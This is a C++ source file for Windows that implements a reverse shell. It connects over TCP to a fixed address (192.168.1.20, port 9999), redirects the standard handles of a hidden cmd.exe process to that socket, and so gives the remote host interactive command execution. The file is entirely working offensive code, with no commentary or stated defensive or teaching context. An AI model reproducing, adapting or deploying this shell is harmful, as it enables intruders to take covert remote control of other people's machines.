#define WIN32_LEAN_AND_MEAN

#include <winsock2.h>
#include <ws2tcpip.h>
#include <ws2def.h>
#include <windows.h>

#include <cstdlib>
#include <iostream>
#include <stdexcept>
#include <string_view>

constexpr std::wstring_view CLIENT_IP = L"192.168.1.20";
constexpr int CLIENT_PORT = 9999;

int main()
{
    WSADATA wsaData;
    bool wsaStarted = false;
    SOCKET socketFd = INVALID_SOCKET;
    HANDLE processHandle = nullptr;
    HANDLE threadHandle = nullptr;
    int exitCode = EXIT_FAILURE;

    try
    {
        if (WSAStartup(0x0202, &wsaData) != 0)
        {
            std::wcerr << L"[!] WSAStartup failed.\n";
            goto CLEANUP;
        }
        wsaStarted = true;

        socketFd = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, 0, 0);
        if (socketFd == INVALID_SOCKET)
        {
            std::wcerr << L"[!] Failed to create socket: " << WSAGetLastError() << L"\n";
            goto CLEANUP;
        }

        struct sockaddr_in sa{.sin_family = AF_INET, .sin_port = htons(CLIENT_PORT)};
        int result = InetPtonW(AF_INET, CLIENT_IP.data(), &sa.sin_addr);
        if (result == 0)
        {
            std::wcerr << L"[!] IP is invalid or has bad format.\n";
            goto CLEANUP;
        }
        else if (result == -1)
        {
            std::wcerr << L"[!] InetPtonW failed: " << WSAGetLastError() << L"\n";
            goto CLEANUP;
        }

        if (connect(socketFd, reinterpret_cast<struct sockaddr *>(&sa), sizeof(sa)) != 0)
        {
            std::wcerr << L"[!] Connect failed.\n";
            goto CLEANUP;
        }

        STARTUPINFOW startupInfo{};
        PROCESS_INFORMATION processInfo{};

        startupInfo.cb = sizeof(startupInfo);
        startupInfo.dwFlags = STARTF_USESTDHANDLES;
        startupInfo.hStdInput = reinterpret_cast<HANDLE>(socketFd);
        startupInfo.hStdOutput = reinterpret_cast<HANDLE>(socketFd);
        startupInfo.hStdError = reinterpret_cast<HANDLE>(socketFd);

        wchar_t cmd[] = L"cmd.exe";
        bool success = CreateProcessW(
            nullptr,
            cmd,
            nullptr,
            nullptr,
            TRUE,
            CREATE_NO_WINDOW,
            nullptr,
            nullptr,
            &startupInfo,
            &processInfo
        );

        if (!success)
        {
            std::wcerr << L"Failed to execute process.\n";
            goto CLEANUP;
        }

        processHandle = processInfo.hProcess;
        threadHandle = processInfo.hThread;
        exitCode = EXIT_SUCCESS;
    }
    catch (const std::runtime_error &e)
    {
        std::cerr << e.what() << std::endl;
        exitCode = EXIT_FAILURE;
    }

CLEANUP:
    if (processHandle != nullptr) CloseHandle(processHandle);
    if (threadHandle != nullptr) CloseHandle(threadHandle);
    if (socketFd != INVALID_SOCKET) closesocket(socketFd);
    if (wsaStarted) WSACleanup();

    return exitCode;
}
